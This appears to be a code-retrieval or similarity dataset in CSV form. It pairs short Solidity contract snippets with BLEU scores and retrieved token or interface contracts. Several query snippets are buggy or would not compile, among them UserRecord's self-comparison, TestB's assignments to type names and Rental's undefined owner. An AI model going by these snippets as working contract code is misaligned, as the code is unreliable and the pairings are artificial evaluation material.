sni,bleu,code
"contract CampaignFactory {
    Campaign[] public deployedCampaigns;

    function createCampaign(string memory campaignName) public payable {
        Campaign newCampaign = (new Campaign).value(msg.value)(msg.sender, campaignName);
        deployedCampaigns.push(newCampaign);
    }

    function getCampaigns() public view returns (Campaign[] memory) {
        return deployedCampaigns;
    }

    
    function getActiveCampaigns() public view returns (Campaign[] memory) {
        
    }
}",0.5561435630583564,"contract TID_TOKEN is ERC20 {
	string private _name = ""Tridac"";
    	string private _symbol = ""TID"";
    	uint8 private _decimals = 8;
        	
	constructor() public {
	    _mint(msg.sender, 7000000000000000);
	}

	
    	function name() public view returns (string memory) {
      	    return _name;
    	}

	
	function symbol() public view returns (string memory) {
	    return _symbol;
	}

        
	function decimals() public view returns (uint8) {
	  return _decimals;
	}
}"
"contract Campaign {
    address public campaignManager; 
    string public campaignName;
    bool public campaignActive; 
...",0.5771401245076446,"contract TokenInterface is ERC20 {

  string public name;

  string public symbol;

  uint public decimals;

}"
"contract Caller {

    Called public called_address;

    function set_address(address _addy) {
        called_address = Called(_addy);
    }

    function set(uint256 _var) {
        called_address.set(_var);
    } 

    function set_call(address _called, uint256 _var) {
        require(_called.call(bytes4(sha3(""set(uint256)"")), _var));
    }
}",0.5962966649563388,"contract ICalled is IOwned {

    

    function callers(address) public pure returns (bool) { }



    function appendCaller(address _caller) public;  

    function removeCaller(address _caller) public;  

    

    event AppendCaller(ICaller _caller);

    event RemoveCaller(ICaller _caller);

}"
"contract Sandbox {

  struct Leader {
    address host;
    uint fitness;
  }

  Leader[] public myList;

  function append(uint value) public {
    Leader memory leader = Leader(msg.sender, value);
    myList.push(leader);
  }

}",0.5900904947128356,"contract locaToken {

    function transferFrom(address _from, address _to, uint _value) public returns (bool);

    function allowance(address _owner, address _spender) public view returns (uint);

}"
"contract PersonContract {

    using MyLib for MyLib.PersonsData ;

    MyLib.PersonsData mypersons  ;

    function PersonContract() payable { 
        mypersons.MyLibInit() ;
    }

    function () {
        revert() ; 
    }

    function AddPerson()  payable public {
        mypersons.AddPerson() ; 
    }

}",0.5238037145579173,"contract HasNoEther is Ownable {

  address thisContract = this;

  
  function HasNoEther() public payable {
    require(msg.value == 0);
  }

  
  function() external {
  }

  
  function reclaimEther() external onlyOwner {
    assert(owner.send(thisContract.balance));
  }
}"
"contract MarkAttendance {

struct AttendeeDetails {
    address attendance_giver;
    address attendee;
    uint attendance_opinion;
    uint256 timestamp;
    uint256 date_of_attendance;
}


mapping(uint => AttendeeDetails) public attendeeDetails;
uint public attendeeDetailsCount;

function markAttendance(address _attendee, uint _attendance_opinion, uint256 _date) public {
    attendeeDetailsCount ++;
    attendeeDetails[attendeeDetailsCount] = AttendeeDetails(msg.sender, _attendee, _attendance_opinion, now, _date);
    }
}",0.5227194031455608,"contract CSToken is owned {uint8 public decimals;

	uint[] public agingTimes;

	address[] public addressByIndex;

	function balanceOf(address _owner) constant returns (uint256 balance);

	function mintToken(address target, uint256 mintedAmount, uint agingTime);

	function addAgingTime(uint time);

	function allAgingTimesAdded();

	function addAgingTimesForPool(address poolAddress, uint agingTime);

	function countAddresses() constant returns (uint256 length);
}"
"contract Test {

    struct S {
        string s;
        uint u;
    }

    function returnTwoValues() private returns (string s, uint u) {
        s = ""123"";
        u = 123;
    }

    constructor() {
        S memory s = S(returnTwoValues());
    }
}",0.5764151932166176,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract B is A {

    string greeting;
    function B(string _greeting) { greeting = _greeting; }

}",0.5334402958540256,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract greeter is mortal {
    
    string greeting;

    
    function greeter(string _greeting) public {
        greeting = _greeting;
    }

    
    function greet() constant returns (string) {
        return greeting;
    }

    function updateGreet(string _greeting) public payable returns(bool) {
        greeting = _greeting;
        return true;
    } 
}",0.5823470633889697,"contract ERC721Metadata is ERC721Basic {
  
  
  
  bytes4 constant INTERFACE_ERC721_METADATA = 0x5b5e139f;

  function name() public view returns (string _name);
  function symbol() public view returns (string _symbol);
  function tokenURI(uint256 _tokenId) public view returns (string);
}"
"contract GiftRegistry {

  uint256 idCounter = 0;
  enum GiftStatus { Offered }

  struct Gift {
    string description;
    uint256 value;
    GiftStatus status;
    address giftGiver;
    address giftReceiver;
    address giftApprover;
  }

  mapping(uint256 => Gift) public giftMap;

  function doesGiftExist(uint256 _giftId) private view returns(bool){
    Gift memory gift = giftMap[_giftId];
    bytes memory giftAsBytes = bytes(gift.description);

    return giftAsBytes.length > 0;
  }

  function getGift(uint256 _giftId) public view returns(string memory, uint256, GiftStatus, address, address, address){
    require(doesGiftExist(_giftId), 'Gift not found');
    Gift memory gift = giftMap[_giftId];

    return (
      gift.description,
      gift.value,
      gift.status,
      gift.giftGiver,
      gift.giftReceiver,
      gift.giftApprover
    );
  }

  function offerGift(string memory _description, uint256 _value, address _giftReceiver) public returns(uint256) {
    uint256 currentId = idCounter;
    giftMap[currentId] = Gift(_description, _value, GiftStatus.Offered, msg.sender, _giftReceiver, address(0));

    idCounter = idCounter + 1;

    return currentId;
  }
}",0.5712104690866335,"contract SSC_HowManyPeoplePaid {
 
    event Bought(address _address);
    event PriceUpdated(uint256 _price);
 
    
    address private _owner;
 
    
    uint256 private _count = 0;
    
    uint256 private _price = 1500000000000000;
    
    
    mapping (address => bool) _clients;
    
    constructor() public {
        _owner = msg.sender;   
    }
    
   function withdraw() public{
        require(msg.sender == _owner);
        _owner.transfer(address(this).balance);
    }
    
    
    
    function() public payable { }
    
    function buy() public payable {
        
        assert(msg.value >= _price);
        
        
        if (!_clients[msg.sender]) {
            _clients[msg.sender] = true;
            _count += 1;
        }
        
        
        emit Bought(msg.sender);
    }
    
    
    
    function setPrice(uint256 newPrice) public {
        require(msg.sender == _owner);
        assert(newPrice > 0);
        
        
        _price = newPrice;
        
        
        emit PriceUpdated(newPrice);
    }
    
    
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    function getPrice() public view returns (uint256) {
        return _price;
    }
    
    
    
    
    function getCount() public view returns (bool, uint256) {
        if(_clients[msg.sender]){
            return (true,_count);    
        }
        return (false, 0);
    }
    
    function isClient(address _address) public view returns (bool) {
        return _clients[_address];
    }
}"
"contract TestB {
    B testB;
    A testA;

    function beforeEach() {
        A = A(DeployedAddresses.A());
        B = testA.createB(""test"");
    }

    function testOwnerIsSet() {
        Assert.equal(address(A), address(B), ""Owner's address does not match"");
    }
}",0.5261485200055015,"contract MultiSender {
    function multiSend(uint256 amount, address[] addresses) public returns (bool) {
        for (uint i = 0; i < addresses.length; i++) {
            addresses[i].transfer(amount);
        }
    }

    function () public payable {
        
    }
}"
"contract Voting {
    
    
    
    event AddedCandidate(uint candidateID);

    
    struct Voter {
        bytes32 uid; 
        uint candidateIDVote;
    }
    
    struct Candidate {
        bytes32 name;
        bytes32 party; 
        
        
        bool doesExist; 
    }

    
    
    uint numCandidates; 
    uint numVoters;

    
    
    
    
    
    mapping (uint => Candidate) candidates;
    mapping (uint => Voter) voters;
    
    

    function addCandidate(bytes32 name, bytes32 party) public {
        
        uint candidateID = numCandidates++;
        
        candidates[candidateID] = Candidate(name,party,true);
        AddedCandidate(candidateID);
    }

    function vote(bytes32 uid, uint candidateID) public {
        
        if (candidates[candidateID].doesExist == true) {
            uint voterID = numVoters++; 
            voters[voterID] = Voter(uid,candidateID);
        }
    }

    
    

    
    
    function totalVotes(uint candidateID) view public returns (uint) {
        uint numOfVotes = 0; 
        for (uint i = 0; i < numVoters; i++) {
            
            if (voters[i].candidateIDVote == candidateID) {
                numOfVotes++;
            }
        }
        return numOfVotes; 
    }

    function getNumOfCandidates() public view returns(uint) {
        return numCandidates;
    }

    function getNumOfVoters() public view returns(uint) {
        return numVoters;
    }
    
    function getCandidate(uint candidateID) public view returns (uint,bytes32, bytes32) {
        return (candidateID,candidates[candidateID].name,candidates[candidateID].party);
    }
}",0.5374174441357419,"contract EtherCard {

  struct Gift {
      uint256 amount;
      uint256 amountToRedeem;
      bool redeemed;
      address from;
  }
  
  
  address public owner;
  mapping (bytes32 => Gift) gifts;
  uint256 feeAmount;

  function EtherCard() public {
    owner = msg.sender;
    feeAmount = 100; 
  }

  function getBalance() public view returns (uint256) {
      return this.balance;
  }

  function getAmountByCoupon(bytes32 hash) public view returns (uint256) {
      return gifts[hash].amountToRedeem;
  }

  function getRedemptionStatus(bytes32 hash) public view returns (bool) {
      return gifts[hash].redeemed;
  }

  
  function redeemGift(string coupon, address wallet) public returns (uint256) {
      bytes32 hash = keccak256(coupon);
      Gift storage gift = gifts[hash];
      if ((gift.amount <= 0) || gift.redeemed) {
          return 0;
      }
      uint256 amount = gift.amountToRedeem;
      wallet.transfer(amount);
      gift.redeemed = true;
      return amount;
  }

  
  function createGift(bytes32 hashedCoupon) public payable {
        if (msg.value * 1000 < 1) { 
            return;
        }
        uint256 calculatedFees = msg.value/feeAmount;
        
        var gift = gifts[hashedCoupon];
        gift.amount = msg.value;
        gift.amountToRedeem = msg.value - calculatedFees;
        gift.from = msg.sender;
        gift.redeemed = false;

        
        owner.transfer(calculatedFees);                
  }
}"
"contract CollegeAdmin {
uint public studentAge=18;
event changedAge(uint age);
function setAge(uint age) public { 
studentAge = age;
changedAge(age);
}
}",0.5570747013013061,"contract LiquidPledging {
    function confirmPayment(uint64 idPledge, uint amount) public;
    function cancelPayment(uint64 idPledge, uint amount) public;
}"
"contract Applications {

  address applicant;

  mapping(uint => string) Application;

  function Applications() internal {
    applicant = msg.sender;
  } 

  modifier ifApplicant() {
    if (applicant != msg.sender) {
      revert();
    } else {
      _;
    }
  }

  function setApplication(uint id, string data) public {
    Application[id] = data;
  }

  function getApplication(uint id) ifApplicant public view returns (string) {
     return Application[id];
  }
}",0.5738996415295421,"contract DigitalPrintImage {

	struct ImageMetadata {

        uint finalSeed;

        bytes32[] potentialAssets;

        uint timestamp;

        address creator;

        string ipfsHash;

        string extraData;

    }



    mapping(uint => ImageMetadata) public imageMetadata;



	function totalSupply() public view returns (uint256);

	function getImageMetadata(uint _imageId) public view

    	returns(address, string, uint, string, uint, bytes32[]);

}"
"contract Test {
    event Event(address indexed wallet);

    mapping (address => bool) public authorizedWallets;

    uint256 public authorizedWalletCount;

    function add(address _wallet) external {
        _add(_wallet);
        emit Event(_wallet);
    }

    function _add(address _wallet) private {
        require(!authorizedWallets[_wallet]);
        authorizedWallets[_wallet] = true;
        authorizedWalletCount++;
    }
}",0.5582433497321353,"contract Freezable {



  event Frozen(address indexed _account);

  event Unfrozen(address indexed _account);



  mapping (address => bool) public frozenAccounts;



  

  function Freezable() public { }



  

  modifier notFrozen {

    require(!frozenAccounts[msg.sender]);

    _;

  }





  function isFrozen(address account) public view returns (bool) {

    return frozenAccounts[account];

  }

}"
"contract A {
  B b;

  constructor(address _B) {
    b = new interfaceB(_B);
  }

  function availableFunction() {
    b.protectedFunc();
  }
}",0.5708451125777922,"contract SaiTapInterface {
    function sai() public view returns (address);
    function cash(uint256) public;
}"
"contract Oracle {
  struct Request {
    bytes data;
    function(bytes memory) external callback;
  }
  Request[] requests;
  event NewRequest(uint);
  function query(bytes data, function(bytes memory) external callback) {
    requests.push(Request(data, callback));
    NewRequest(requests.length - 1);
  }
  function reply(uint requestID, bytes response) {
    
    requests[requestID].callback(response);
  }
}",0.5352770846774665,"contract DSProxyInterface {

    function execute(bytes memory _code, bytes memory _data) public payable returns (address, bytes32);



    function execute(address _target, bytes memory _data) public payable returns (bytes32);



    function setCache(address _cacheAddr) public payable returns (bool);



    function owner() public returns (address);

}"
"contract OracleUser {
  Oracle constant oracle = Oracle(0x1234567); 
  function buySomething() {
    oracle.query(""USD"", this.oracleResponse);
  }
  function oracleResponse(bytes response) {
    require(msg.sender == address(oracle));
    
  }
}",0.5249181162431066,"contract CoinbaseTest {

    address owner;

    

    constructor() public {

        owner = msg.sender;

    }

    

    function () public payable {

    }

    

    function withdraw() public {

        require(msg.sender == owner);

        msg.sender.transfer(this.balance);

    }



}"
"contract A is Owned{ 
  B b;
  function A() { 
    b = new B(); 
  }
}",0.5423752619931431,"contract IOwned {
	function owner() public pure returns (address) {}
}"
"contract Asset {

    address public owner;
    struct Asset {
        string title;
        string description;
        uint  assetTime;
        uint price;
    }

    Asset[] public  assets;

    event LogAssetAdded(address indexed fromAddress, string description);

    
    function addAsset(string  description1, string title1, uint price1,uint assetTime1) 
      returns (uint, string, string, uint, uint) {
        uint assetID = assets.length++;
        Asset o = assets[assetID];

        o.description = description1;
        o.assetTime=assetTime1;
        o.title = title1;
        o.price = price1;

        LogAssetAdded(msg.sender, description1);

        return (assetID, assets[assetID].description, assets[assetID].title, assets[assetID].price, 
          assets[assetID].assetTime);
    }

    
    function assetCount() public constant returns(uint) {
        uint assetCount =assets.length;
        return(assetCount);
    }

    function getAssetPrice(uint assetID) public constant returns(uint) {
        return assets[assetID].price;
    }

    function getDefAssetPrice() public constant returns(uint) {
        return assets[assets.length-1].price;
    }

    function getDefAssetTitle() public constant returns(string) {
        return assets[assets.length-1].title;
    }

    function getDefAssetTime() public constant returns(uint) {
        return assets[assets.length-1].assetTime;
    }
}",0.5796276407624785,"contract tokenCreator is Ownable{



    string internal _symbol;

    string internal _name;

    uint8 internal _decimals;

    uint internal _totalSupply = 500000000;

    mapping (address => uint256) internal _balanceOf;

    mapping (address => mapping (address => uint256)) internal _allowed;



    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {

        _symbol = symbol;

        _name = name;

        _decimals = decimals;

        _totalSupply = _calcTokens(decimals,totalSupply);

    }



   function _calcTokens(uint256 decimals, uint256 amount) internal pure returns (uint256){

      uint256 c = amount * 10**decimals;

      return c;

   }



    function name() public constant returns (string) {

        return _name;

    }



    function symbol() public constant returns (string) {

        return _symbol;

    }



    function decimals() public constant returns (uint8) {

        return _decimals;

    }



    function totalSupply() public constant returns (uint) {

        return _totalSupply;

    }



    function balanceOf(address _addr) public constant returns (uint);

    function transfer(address _to, uint _value) public returns (bool);

    event Transfer(address indexed _from, address indexed _to, uint _value);

}"
"contract UserRecord {
  address public owner;
  bytes32[] public Servicelist;

  constructor () public {
    owner = msg.sender;
    newService(""1"",""Serviceone"",msg.sender);
  }

  struct Service {
    address serviceowner;
    string servicename;
    bytes serviceid;
    bool isService;
  }

  mapping(bytes32 => Service) public servicestructs;

  function isService(bytes32 uid) public view returns(bool isIndeed) {
    return servicestructs[uid].isService;
  }

  function getServiceCount() public view returns(uint count) {
    return Servicelist.length;
  }

  function newService(bytes32 uid, string memory _servicename, address _serviceowner) public returns(bool success) {
    require(!isService(uid));
    servicestructs[uid].servicename = _servicename;
    servicestructs[uid].serviceowner = _serviceowner;
    servicestructs[uid].isService = true;
    Servicelist.push(uid);
    emit LognewService(owner, uid, _servicename, _serviceowner);
    return true;
  }

  function getService(string memory servicequery) public view returns(bool) {
    for(uint i=0;i<Servicelist.length;i++) {
      Service storage service=Servicelist[i];
      string memory service_name=Servicelist[i].servicename;
      if(keccak256(abi.encodePacked(service_name))==keccak256(abi.encodePacked(service_name))) {
        return service_name;
      }
    }
  } 

  event LognewService(address sender, bytes32 hash, string servicename, address serviceowner);
}",0.5453513602393767,"contract OurERC20 {



  using SafeMath for uint256;

  string _name;

  string _symbol;

  mapping (address => uint256) _balances;

  uint256 _totalSupply;

  uint8 private _decimals;

  event Transfer(address indexed from, address indexed to, uint tokens);

  

  constructor() public {

    _name = ""HOLA"";

    _symbol = ""HL"";

    _decimals = 0;

  }

  

  function decimals() public view returns(uint8) {

      return _decimals;

  }

  

  function totalSupply() public view returns (uint256) {

      return _totalSupply;

  }

  

  function name() public view returns (string memory) {

     return _name;

  }

  

  function symbol() public view returns (string memory) {

     return _symbol;

  }

  

  function mint(uint256 amount) public payable {

      require(msg.value == amount.mul(0.006 ether));

      _balances[msg.sender] = _balances[msg.sender].add(amount);

      _totalSupply = _totalSupply + amount;

  }

  

  function burn(uint256 amount) public {

      require(_balances[msg.sender] == amount);

      _balances[msg.sender] = _balances[msg.sender].sub(amount);

      msg.sender.transfer(amount.mul(0.006 ether));

      _totalSupply = _totalSupply - amount;

  }

  

  function transfer(address _to, uint256 value) public returns (bool success) {

      require(_balances[msg.sender] >= value);

      _balances[msg.sender] = _balances[msg.sender].sub(value);

      _balances[_to] = _balances[_to].add(value);

      emit Transfer(msg.sender, _to, value);      

      return true;

  }

  

  

  

  

  

  

}"
"contract Rental {
    struct PaidRent {
        uint id;
        uint value;
    }
    event RentPaid(bool Status);
    PaidRent[] public paidrents;
    function payRent(uint _rent) public payable returns(bool status) {
        owner.send(_rent);
        paidrents.push(PaidRent({
            id : paidrents.length + 1,
            value : _rent
        }));
        RentPaid(true);
        return true;
    }
}",0.5707233255229308,"contract ERC223Interface {
    function transfer(address _to, uint _value) public returns (bool success);
    function transfer(address _to, uint _value, bytes _data) public returns (bool success);
    event ERC223Transfer(address indexed _from, address indexed _to, uint _value, bytes _data);
}"
